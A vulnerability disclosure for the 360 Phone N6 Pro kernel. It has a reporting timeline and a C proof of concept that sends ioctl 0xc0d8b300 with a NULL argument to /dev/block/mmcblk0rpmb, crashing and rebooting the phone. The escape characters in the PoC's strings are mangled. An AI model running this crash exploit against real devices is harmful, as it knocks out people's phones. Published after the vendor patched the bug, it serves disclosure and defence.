# 360 Phone N6 Pro Kernel Vuln
These page show the details of the vulnerability found in 360 Phone N6 Pro. I reported these bugs to src@alarm.360.cn on On 5/4/2018 and now I have been told they have repaired the bugs and the details can be published. However,  Qiku Tec. does not have an advisory page for phone products at the moment. I think it is a must to list the detailed infomation here.

## Time Line
 * 5/4/2018 Bugs were reported to src@alarm.360.cn.
 * 5/14/2018 Qiku Tec. got confirmation that the bug could cause kernel crash.
 * 07/14/2018 Qiku Tec. had started updating 360 N6 Pro with the security patches.
 
### Abstract
 
* Name: 360 Phone N6 Pro
* Model: 1801-A01
* Date: 2018-10-15
* Reporter: Shuaibing Lu, Liang Ming
* Vendor: http://www.qiku.com/product/n6p/index.html
* Product Link: http://www.qiku.com/product/n6p/index.html
* Android Version: 7.1.1
* Version Number: V096
* Kernel Version: Linux localhost 4.4.21-perf #1 SMP PREEMPT Wed Mar 28 15:24:20 UTC 2018 aarch64

### Description

Kernel module in the kernel component of 360 Phone N6 Pro V096 allows attackers to inject a crafted argument via the argument of an ioctl on device /dev/block/mmcblk0rpmb with the command **3235427072** and cause a kernel crash.

### POC

```
/*
* This is poc of 360 N6 Pro, 1801-A01
* Android Version: 7.1.1
* Version Number: V096
* Kernel Version: Linux localhost 4.4.21-perf #1 SMP PREEMPT Wed Mar 28 15:24:20 UTC 2018 aarch64
* A NULL pointer bug in the ioctl interface of device file /dev/block/mmcblk0rpmb causes the system crash via IOCTL 3235427072.
* This Poc should run with permission to do ioctl on /dev/block/mmcblk0rpmb.
*/
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>

const static char *driver = "/dev/block/mmcblk0rpmb";
static command = 3235427072; // 0xc0d8b300

int main(int argc, char **argv, char **env) {
int fd = 0;
fd = open(driver, O_RDWR);
if (fd < 0) {
printf("Failed to open %s, with errno %dn", driver, errno);
system("echo 1 > /data/local/tmp/log");
return -1;
}

printf("Try ioctl device file '%s', with command 0x%x and payload NULLn", driver, command);
printf("System will crash and reboot.n");
if(ioctl(fd, command, NULL) < 0) {
printf("Allocation of structs failed, %dn", errno);
system("echo 2 > /data/local/tmp/log");
return -1;
}
close(fd);
return 0;
}
```
### References
[360 Phone N6 pro](http://www.qiku.com/product/n6p/index.html)
